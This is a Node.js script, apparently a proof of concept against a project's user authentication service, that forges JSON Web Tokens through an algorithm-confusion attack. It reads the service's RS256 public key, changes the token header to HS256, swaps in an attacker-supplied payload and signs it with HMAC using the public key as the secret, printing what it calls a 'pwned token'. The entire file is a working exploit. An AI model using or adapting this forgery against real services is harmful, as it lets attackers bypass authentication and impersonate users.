var fs = require('fs');
var path = require('path');

let JWT_PUB = fs.readFileSync(path.normalize(__dirname + '/../../user-auth-service/keys/jwtRS256.key.pub'));
let REAL_VALID_TOKEN = '';
let EVIL_PAYLOAD = '';

async function main() {
    var args = process.argv.slice(2);
    if(args.length < 2)
        return;

    // read in valid token
    REAL_VALID_TOKEN = args[0];

    b64Header = REAL_VALID_TOKEN.split(".")[0];
    b64Payload = REAL_VALID_TOKEN.split(".")[1];

    let headerBuff = Buffer.from(b64Header, 'base64');
    let payloadBuff = Buffer.from(b64Payload, 'base64');

    let header = JSON.parse(headerBuff.toString('ascii'));
    header.alg = "HS256";

    let payload = JSON.parse(payloadBuff.toString('ascii'));
    EVIL_PAYLOAD = JSON.parse(Buffer.from(args[1], 'base64').toString('ascii'));

    // create header and payload as base64
    headerNpayload = Buffer.from(JSON.stringify(header)).toString('base64') + "." + Buffer.from(JSON.stringify(EVIL_PAYLOAD)).toString('base64');

    // remove '=' padding of base64 strings
    headerNpayload = headerNpayload.split(".").map(it => it.substr(0, (it).length - it.match('=*$')[0].length)).join(".");

    verifySig = require("crypto").createHmac("sha256", JWT_PUB).update(headerNpayload).digest('base64');
    verifySig = verifySig.split('/').join('_').split('+').join('-');

    // remove '=' padding of verifySignature
    verifySig = verifySig.substr(0, (verifySig).length - verifySig.match('=*$')[0].length);

    // create pwned token
    pwned_token = headerNpayload + "." + verifySig;
    console.log(pwned_token);
}
if (require.main === module) {
    main();
}
